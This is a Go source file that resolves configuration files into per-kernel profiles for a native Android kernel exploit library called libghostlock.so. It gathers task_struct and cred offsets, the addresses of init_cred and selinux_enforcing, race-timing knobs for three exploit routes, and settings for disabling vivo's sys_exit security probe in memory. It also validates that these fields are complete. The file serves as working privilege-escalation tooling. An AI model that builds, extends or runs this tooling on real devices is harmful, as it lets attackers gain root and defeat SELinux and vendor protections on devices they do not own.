package profile

import "fmt"

// Route identifiers, identical to the native enum and to the `route` block
// keys of the shipped .conf files.
var RouteNames = []string{"tcp_zerocopy", "select_stack", "multicast_waiter"}

// KV is one entry of a profile blob section (name + signed 64-bit value).
type KV struct {
	Key string
	Val int64
}

// Section is one named table of the profile blob.
type Section struct {
	Name    string
	Entries []KV
}

// Profile is the fully resolved, device-independent description of how to run
// the exploit on one kernel build. It is serialised into the binary blob that
// libghostlock.so consumes (`--load-prebuilt-profile`).
type Profile struct {
	Release      string
	Route        string
	RouteIdx     int
	FallbackIdx  int
	Sections     []Section
	InvalidPaths []string
}

var taskStructKeys = []string{
	"prio", "normal_prio", "sched_task_group", "pi_lock", "pi_waiters",
	"pi_top_task", "pi_blocked_on", "pid", "tgid", "atomic_flags",
	"real_cred", "cred", "comm", "tasks", "seccomp",
}

var credKeysInt32 = []string{
	"copy_size", "usage_offset", "usage_value", "caps_offset", "caps_count",
	"ref_count", "ref0_offset", "ref1_offset", "ref2_offset", "ref3_offset",
}

var credKeysInt64 = []string{
	"caps_value", "ref0_image", "ref1_image", "ref2_image", "ref3_image",
}

var offsetKeys = []string{
	"init_task", "init_cred", "empty_zero_page", "root_task_group",
	"selinux_enforcing", "selinux_blob_sizes", "security_hook_heads",
	"slide_nfulnl_logger", "slide_loggers_0_1", "slide_boot_id", "vr_sys_exit_tp",
}

var execGroups = []struct {
	name string
	keys []string
}{
	{"execution.recommended_cpus", []string{"main", "consumer"}},
	{"execution.heap", []string{"prepare_max_attempts", "prepare_timeout_ms", "kernelsnitch_timeout_ms"}},
	{"execution.race", []string{"route_wait_ms", "route_done_timeout_ms", "setup_settle_us", "state_poll_interval_us"}},
	{"execution.stages", []string{"w1_attempts", "w1_settle_us", "w1_scratch_repair_attempts", "w2_attempts", "w2_settle_us", "w3_chain_rounds", "w3_attempts", "w3_settle_us"}},
	{"execution.handoff", []string{"pre_dispatch_settle_ms", "module_poll_attempts", "module_poll_interval_ms", "enforce_poll_attempts", "enforce_poll_interval_ms"}},
	{"execution.consumer", []string{"max_calls", "burst_calls"}},
}

// execPath maps a blob key of an execution section back to the document path
// the original resolver reads. The consumer knobs live under the select_stack
// route tuning, not under execution.consumer.
func execPath(section, key string) string {
	if section == "execution.consumer" {
		return "execution.routes.select_stack.consumer_" + key
	}
	return section + "." + key
}

// lookup mirrors the app resolver's k3 view: it rewrites the handful of
// aliases the shipped profiles rely on before touching the document.
type lookup struct {
	root     Map
	route    string
	fallback string
}

func (l *lookup) get(path string) (int64, bool) {
	switch path {
	case "execution.recommended_cpus.main", "execution.recommended_cpus.consumer":
		suffix := "main"
		if path == "execution.recommended_cpus.consumer" {
			suffix = "consumer"
		}
		if v, ok := Get(l.root, "execution.selected_cpus."+suffix); ok {
			if n, ok := toInt(v); ok {
				return n, true
			}
		}
	}

	alias := ""
	switch path {
	case "compact_waiter":
		alias = "compact_waiter"
	case "pselect_waiter_shift":
		alias = "waiter_shift"
	}
	if alias != "" {
		if n, ok := l.routeOrFallback(alias); ok {
			return n, true
		}
	}
	if len(path) > 6 && path[:6] == "mcast." {
		key := path[6:]
		if n, ok := l.routeOrFallback(key); ok {
			return n, true
		}
		if v, ok := Get(l.root, "mcast."+key); ok {
			if n, ok := toInt(v); ok {
				return n, true
			}
		}
	}
	if v, ok := Get(l.root, path); ok {
		return toInt(v)
	}
	return 0, false
}

func (l *lookup) routeOrFallback(key string) (int64, bool) {
	if l.route != "" {
		if v, ok := Get(l.root, "route."+l.route+"."+key); ok {
			if n, ok := toInt(v); ok {
				return n, true
			}
		}
	}
	if l.fallback != "" && l.fallback != "none" {
		if v, ok := Get(l.root, "fallback.route."+l.fallback+"."+key); ok {
			if n, ok := toInt(v); ok {
				return n, true
			}
		}
	}
	return 0, false
}

// i32 is the app's fm.A(): a missing or null key reads as 0, the value is
// widened through a 32-bit int and then masked to an unsigned 32-bit pattern.
func (l *lookup) i32(path string, invalid *[]string) int64 {
	if n, ok := l.get(path); ok {
		return int64(int32(n)) & 0xFFFFFFFF
	}
	if invalid != nil {
		*invalid = append(*invalid, path)
	}
	return 0
}

// i64 is the app's fm.B(): signed 64-bit, 0 when absent.
func (l *lookup) i64(path string, invalid *[]string) int64 {
	if n, ok := l.get(path); ok {
		return n
	}
	if invalid != nil {
		*invalid = append(*invalid, path)
	}
	return 0
}

func (l *lookup) opt(path string) (int64, bool) {
	if n, ok := l.get(path); ok {
		return n, true
	}
	return 0, false
}

func toInt(v any) (int64, bool) {
	switch t := v.(type) {
	case int64:
		return t, true
	case int:
		return int64(t), true
	case bool:
		if t {
			return 1, true
		}
		return 0, true
	case string:
		if n, err := parseInt(t); err == nil {
			return n, true
		}
	}
	return 0, false
}

func routeIndex(name string) int {
	for i, n := range RouteNames {
		if n == name {
			return i + 1
		}
	}
	return 0
}

func pickRoute(conf Map) string {
	v, ok := conf["route"]
	if !ok {
		return ""
	}
	if s, ok := v.(string); ok {
		if s == "" || s == "null" {
			return ""
		}
		return s
	}
	m, ok := v.(Map)
	if !ok {
		return ""
	}
	for _, n := range RouteNames {
		if _, ok := m[n]; ok {
			return n
		}
	}
	return ""
}

func pickFallback(conf Map) string {
	if v, ok := Get(conf, "fallback.to"); ok {
		if s, ok := v.(string); ok && s != "" && s != "null" {
			return s
		}
	}
	if v, ok := conf["fallback_to"]; ok {
		if s, ok := v.(string); ok && s != "" && s != "null" {
			return s
		}
	}
	return ""
}

// Resolve turns a parsed .conf document into the profile that the native
// binary expects. safeMode is the value of `meta.safe_mode` (the app always
// writes 0; 1 makes the root script disable every /data/adb module).
func Resolve(conf Map, safeMode int64) (*Profile, error) {
	relV, _ := conf["release"]
	release, ok := relV.(string)
	if !ok || release == "" {
		return nil, fmt.Errorf("profile: missing \"release\" string")
	}
	route := pickRoute(conf)
	routeIdx := routeIndex(route)
	if routeIdx == 0 {
		return nil, fmt.Errorf("profile: \"route\" must contain one of %v", RouteNames)
	}
	fallback := pickFallback(conf)
	fbIdx := routeIndex(fallback)

	l := &lookup{root: conf, route: route, fallback: fallback}
	var invalid []string

	p := &Profile{Release: release, Route: route, RouteIdx: routeIdx, FallbackIdx: fbIdx}

	meta := []KV{
		{"kernel_major", l.i32("kernel_major", nil)},
		{"recommend_shizuku", l.i32("recommend_shizuku", nil)},
		{"fallback_route", int64(fbIdx)},
		{"safe_mode", safeMode & 0xFFFFFFFF},
	}
	// vr_guard gates the in-memory neutralisation of vivo's sys_exit probe.
	// The App's writer never emits it, but the native whitelist accepts it and
	// the working profile carries it — without it a vivo device rejects the
	// multicast route with EADDRNOTAVAIL.
	if n, ok := l.opt("vr_guard.enabled"); !ok {
		if m, ok2 := l.opt("vr_guard"); ok2 {
			meta = append(meta, KV{"vr_guard", m & 0xFFFFFFFF})
		}
	} else {
		meta = append(meta, KV{"vr_guard", n & 0xFFFFFFFF})
	}
	p.Sections = append(p.Sections, Section{"meta", meta})

	ts := make([]KV, 0, len(taskStructKeys))
	for _, k := range taskStructKeys {
		ts = append(ts, KV{k, l.i32("task_struct."+k, nil)})
	}
	p.Sections = append(p.Sections, Section{"task_struct", ts})

	cred := make([]KV, 0, 15)
	for _, k := range credKeysInt32 {
		cred = append(cred, KV{k, l.i32("cred."+k, nil)})
	}
	for _, k := range credKeysInt64 {
		cred = append(cred, KV{k, l.i64("cred."+k, nil)})
	}
	p.Sections = append(p.Sections, Section{"cred", cred})

	off := make([]KV, 0, len(offsetKeys))
	for _, k := range offsetKeys {
		off = append(off, KV{k, l.i64("offset."+k, nil)})
	}
	p.Sections = append(p.Sections, Section{"offset", off})

	// The `kernel` section only exists when at least one optional key is set.
	var kern []KV
	if n, ok := l.opt("kernel_phys_load"); ok {
		kern = append(kern, KV{"kernel_phys_load", n})
	}
	if n, ok := l.opt("kernel_phys_offset"); ok {
		kern = append(kern, KV{"kernel_phys_offset", n})
	}
	if n, ok := l.opt("compact_waiter"); ok {
		kern = append(kern, KV{"compact_waiter", n & 0xFF})
	}
	if n, ok := l.opt("kernelsnitch.collisions"); ok {
		kern = append(kern, KV{"kernelsnitch_collisions", n & 0xFFFFFFFF})
	}
	if n, ok := l.opt("kernelsnitch.mm_struct_sz"); ok {
		kern = append(kern, KV{"mm_struct_sz", n & 0xFFFFFFFF})
	}
	if len(kern) > 0 {
		p.Sections = append(p.Sections, Section{"kernel", kern})
	}

	for _, g := range execGroups {
		es := make([]KV, 0, len(g.keys))
		for _, k := range g.keys {
			es = append(es, KV{k, l.i32(execPath(g.name, k), &invalid)})
		}
		p.Sections = append(p.Sections, Section{g.name, es})
	}

	var routeSection []KV
	switch route {
	case "tcp_zerocopy":
		// ws1.a() always emits all three keys.
		v1, _ := l.opt("execution.routes.tcp_zerocopy.attempts")
		v2, _ := l.opt("execution.routes.tcp_zerocopy.arm_sequence")
		v3, _ := l.opt("execution.routes.tcp_zerocopy.post_receive_hold_iterations")
		routeSection = []KV{
			{"attempts", int64(int32(v1)) & 0xFFFFFFFF},
			{"arm_sequence", int64(int32(v2)) & 0xFFFFFFFF},
			{"post_receive_hold_iterations", int64(int32(v3)) & 0xFFFFFFFF},
		}
	case "select_stack":
		if n, ok := l.opt("pselect_waiter_shift"); ok {
			routeSection = append(routeSection, KV{"waiter_shift", int64(int32(n))})
		}
		if n, ok := l.opt("compact_waiter"); ok {
			routeSection = append(routeSection, KV{"compact_waiter", n & 0xFF})
		}
		if n, ok := l.opt("execution.routes.select_stack.enter_delay_us"); ok {
			routeSection = append(routeSection, KV{"enter_delay_us", int64(int32(n)) & 0xFFFFFFFF})
		}
		if n, ok := l.opt("execution.routes.select_stack.timeout_us"); ok {
			routeSection = append(routeSection, KV{"timeout_us", int64(int32(n)) & 0xFFFFFFFF})
		}
	case "multicast_waiter":
		if n, ok := l.opt("mcast.waiter_off"); ok {
			routeSection = append(routeSection, KV{"waiter_off", int64(int32(n))})
		}
		if n, ok := l.opt("mcast.buffer_size"); ok {
			routeSection = append(routeSection, KV{"buffer_size", int64(int32(n)) & 0xFFFFFFFF})
		}
		if n, ok := l.opt("mcast.task_offset"); ok {
			routeSection = append(routeSection, KV{"task_offset", int64(int32(n)) & 0xFFFFFFFF})
		}
		if n, ok := l.opt("mcast.lock_offset"); ok {
			routeSection = append(routeSection, KV{"lock_offset", int64(int32(n)) & 0xFFFFFFFF})
		}
		if n, ok := l.opt("mcast.attempts"); ok {
			routeSection = append(routeSection, KV{"attempts", int64(int32(n)) & 0xFFFFFFFF})
		}
		if n, ok := l.opt("mcast.arm_sequence"); ok {
			routeSection = append(routeSection, KV{"arm_sequence", int64(int32(n)) & 0xFFFFFFFF})
		}
		if n, ok := l.opt("mcast.arm_hold"); ok {
			routeSection = append(routeSection, KV{"arm_hold", int64(int32(n)) & 0xFFFFFFFF})
		}
	}
	p.Sections = append(p.Sections, Section{"route." + route, routeSection})

	// vr_guard geometry: how wide the tracepoint funcs array is, so the native
	// can disable the probe without guessing.
	var vg []KV
	if n, ok := l.opt("vr_guard.tracepoint_funcs"); ok {
		vg = append(vg, KV{"tracepoint_funcs", n & 0xFFFFFFFF})
	}
	if len(vg) > 0 {
		p.Sections = append(p.Sections, Section{"vr_guard", vg})
	}
	p.InvalidPaths = invalid
	return p, nil
}

// Validate performs the same sanity checks the native binary runs right after
// loading a profile, so a bad profile is rejected on the host instead of on the
// device.
func (p *Profile) Validate() []string {
	var problems []string
	get := func(section, key string) (int64, bool) {
		for _, s := range p.Sections {
			if s.Name != section {
				continue
			}
			for _, e := range s.Entries {
				if e.Key == key {
					return e.Val, true
				}
			}
		}
		return 0, false
	}
	if v, _ := get("cred", "copy_size"); v <= 0 {
		problems = append(problems, "cred.copy_size is 0: native reports \"credential copy profile is incomplete\"")
	}
	if v, ok := get("meta", "kernel_major"); !ok || (v != 5 && v != 6) {
		problems = append(problems, "meta.kernel_major must be 5 or 6")
	}
	switch p.Route {
	case "multicast_waiter":
		if v, ok := get("route.multicast_waiter", "waiter_off"); !ok || v <= 0 {
			problems = append(problems, "multicast geometry incomplete: route.multicast_waiter.waiter_off missing")
		}
	case "select_stack":
		if _, ok := get("route.select_stack", "waiter_shift"); !ok {
			problems = append(problems, "route.select_stack.waiter_shift missing")
		}
	}
	for _, k := range []string{"init_task", "init_cred", "selinux_enforcing"} {
		if v, ok := get("offset", k); !ok || v == 0 {
			problems = append(problems, "offset."+k+" is 0")
		}
	}
	return problems
}
